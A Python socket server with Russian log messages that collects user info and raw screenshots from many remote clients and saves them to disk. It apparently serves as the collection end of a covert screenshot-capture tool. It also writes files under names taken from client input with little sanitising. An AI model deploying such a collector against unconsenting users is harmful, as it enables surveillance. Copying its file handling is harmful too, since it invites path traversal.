import socket
import threading
import os
import time

clients = {}
SCREENSHOT_DIR = "screenshots"
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

def handle_client(conn, addr):
    try:
        data = b''
        while True:
            part = conn.recv(1024)
            if not part:
                break
            data += part
        conn.close()

        split_index = data.find(b'\n')
        if split_index == -1:
            return

        info = data[:split_index].decode()
        screenshot = data[split_index + 1:]

        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"\n[+] Получено от {addr}")
        print(f"    Инфо: {info}")
        print(f"    Время: {timestamp}")

        user = info.replace(";", "_").replace("=", "-")
        filename = os.path.join(SCREENSHOT_DIR, f"{user}_{int(time.time())}.bmp")
        with open(filename, "wb") as f:
            f.write(screenshot)

        clients[addr] = {
            "info": info,
            "last_active": timestamp,
            "screenshot": filename
        }

    except Exception as e:
        print(f"[!] Ошибка: {e}")

def start_server(host='0.0.0.0', port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen()
    print(f"[SERVER] Ожидание подключений на {host}:{port}...\n")

    try:
        while True:
            conn, addr = server.accept()
            threading.Thread(target=handle_client, args=(conn, addr)).start()
    except KeyboardInterrupt:
        print("\n[!] Сервер остановлен вручную.")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()